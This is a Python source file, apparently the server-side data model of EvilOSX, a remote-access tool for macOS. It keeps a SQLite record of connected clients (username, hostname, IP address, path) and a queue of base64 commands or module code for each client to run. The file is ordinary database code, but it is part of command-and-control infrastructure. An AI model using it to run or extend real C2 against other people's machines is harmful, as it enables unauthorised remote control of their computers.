"""Model for the server."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

import sqlite3
import json
from threading import Lock


class Command:
    """This class represents a command."""

    def __init__(self, client_id, command, module_name="", is_task=False):
        """
        :param client_id The ID of the client which should execute this command.
        :param command The base64 command (or module code) to execute on the client.
        :param module_name The name of the module being executed.
        :param is_task True if this module is a task.
        """
        self.id = client_id
        self.command = command
        self.module_name = module_name
        self.is_task = is_task

    def __str__(self):
        """:return The JSON representation of this class."""
        return json.dumps(self.__dict__)


class Client:
    """This class represents a client."""

    def __init__(self, client_id, username, hostname, remote_ip, path, last_online):
        self.id = client_id
        self.username = username
        self.hostname = hostname
        self.remote_ip = remote_ip
        self.path = path
        self.last_online = last_online


class ClientModel:
    """This class stores client sessions and pending commands via SQLite."""

    def __init__(self):
        self._database = sqlite3.connect("EvilOSX.db", check_same_thread=False)
        self._cursor = self._database.cursor()
        self._lock = Lock()  # We want all database operations synchronized.

        # Setup the database.
        self._cursor.execute("DROP TABLE IF EXISTS clients")
        self._cursor.execute("DROP TABLE IF EXISTS commands")
        self._cursor.execute("CREATE TABLE clients("
                             "client_id string PRIMARY KEY, "
                             "username text, "
                             "hostname text, "
                             "remote_ip text, "
                             "path text, "
                             "last_online text)")
        self._cursor.execute("CREATE TABLE commands("
                             "client_id string, "
                             "command text, "
                             "module_name text, "
                             "is_task boolean)")
        self._database.commit()

    def add_client(self, client):
        """Adds a client session."""
        with self._lock:
            self._cursor.execute("INSERT INTO clients VALUES (?,?,?,?,?,?)",
                                 (client.id, client.username, client.hostname,
                                  client.remote_ip, client.path, client.last_online))
            self._database.commit()

    def get_client(self, client_id):
        """:return The client session of the specified ID, otherwise None."""
        with self._lock:
            response = self._cursor.execute("SELECT * FROM clients WHERE client_id = ?",
                                            (client_id,)).fetchone()
            if response:
                return Client(response[0], response[1], response[2], response[3], response[4], response[5])

    def remove_client(self, client_id):
        """Removes the client session."""
        with self._lock:
            self._cursor.execute("DELETE FROM clients WHERE client_id = ?",
                                 (client_id,))
            self._database.commit()

    def get_clients(self):
        """:return A list of all clients."""
        clients = []

        with self._lock:
            response = self._cursor.execute("SELECT * FROM clients").fetchall()

            for row in response:
                clients.append(Client(row[0], row[1], row[2], row[3], row[4], row[5]))
        return clients

    def send_command(self, command):
        """Adds a command for the client to execute.

        :type command Command
        """
        with self._lock:
            self._cursor.execute("INSERT INTO commands VALUES(?,?,?,?)", (
                command.id, command.command, command.module_name, command.is_task
            ))
            self._database.commit()

    def remove_command(self, client_id):
        """Removes the first command so the next will be on top.

        :type client_id str
        """
        with self._lock:
            # Workaround for https://sqlite.org/compile.html#enable_update_delete_limit
            self._cursor.execute("DELETE FROM commands WHERE rowid = "
                                 "(SELECT rowid FROM commands WHERE client_id = ? LIMIT 1)", (client_id,))
            self._database.commit()

    def get_command(self, client_id):
        """:return The first command in the list for the client to execute.

        Once the command is sent to the client remove_command should be called.
        """
        with self._lock:
            response = self._cursor.execute("SELECT * FROM commands WHERE client_id = ?",
                                            (client_id,)).fetchone()
            if response:
                command = Command(response[0], response[1], response[2], response[3])
                return command

    def update_client(self, client_id, path, last_online):
        """Updates the client's path and last online time."""
        with self._lock:
            self._cursor.execute("UPDATE clients SET path = ?, last_online = ? WHERE client_id = ?",
                                 (path, last_online, client_id))
            self._database.commit()

    def close(self):
        """Closes the database."""
        self._database.close()
